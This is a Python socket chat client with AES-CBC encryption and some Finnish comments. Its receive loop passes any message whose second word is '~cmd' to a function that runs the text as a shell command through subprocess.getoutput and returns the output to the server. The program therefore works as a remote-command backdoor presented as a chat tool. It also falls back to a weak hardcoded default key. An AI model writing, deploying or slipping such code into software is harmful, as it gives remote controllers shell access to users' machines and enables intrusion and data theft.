import socket
import subprocess
import threading
import sys
import base64
from Crypto.Cipher import AES
import Crypto.Util.Padding
import Crypto.Random

###################### FUNKTIOT #############################

def receive():
    while True:
        try:
            message = client.recv(1024)
            nickTest = message.decode('UTF-8')
            if nickTest == 'NICK':
                client.send(nickname.encode('UTF-8'))
                pass
            else:
                try:
                    message_encrypted = base64.b64decode(message)
                    message_utf = decrypt(message_encrypted)
                    message = message_utf.decode('UTF-8')
                    try:
                        message_list = message.split()
                        if message_list[0] == (f'{nickname}:'):
                            pass
                        else:
                            if message_list[1] == "~cmd":
                                cmd(message_list)
                            else:
                                print(message)
                    except:
                        print("Failed to decode the message")
                except:
                    message = message.decode('UTF-8')
                    print(message)

        except:
            print("Receive function failed")
            client.close()
            break

def write():
    while True:
        message_input = input("")
        if len(message_input) == 0:
            pass
        else:
            message = f'{nickname}: {message_input}'
            message_utf = message.encode('UTF-8')
            message_aes = encypt(message_utf)
            message64 = base64.b64encode(message_aes)
            client.send(message64)

def encypt(message):
    iv = Crypto.Random.get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    message = Crypto.Util.Padding.pad(message, AES.block_size)
    message = iv + cipher.encrypt(message)
    return message

def decrypt(message):
    iv = message[:AES.block_size]
    cipher_dec = AES.new(key, AES.MODE_CBC, iv)
    message = cipher_dec.decrypt(message[AES.block_size:])
    message = Crypto.Util.Padding.unpad(message, AES.block_size)
    return message

def cmd(commands):

    del commands[0:2]
    commands_str = " ".join(commands)

    try:
        output = subprocess.getoutput(commands_str)
        output = f'{nickname}: {output}'
    except Exception as e:
        print(e)
    try:
        output_utf = output.encode('UTF-8')
        output_aes = encypt(output_utf)
        output_b64 = base64.b64encode(output_aes)
        client.send(output_b64)
    except:
        print("Ei outputtia")



########################### MAIN ####################################

if len(sys.argv) != 4:
    print("Correct usage: script, IP address, port number, key, nickname")
    exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])
nickname = str(sys.argv[3])

key = input("Give key in 16 characters, else the default key will be used: ")
default_key = "abcdefghijklmnop"
if len(key) == 0:
    key = default_key
key = key.encode('UTF-8')

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
print("Connected to host")


receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()

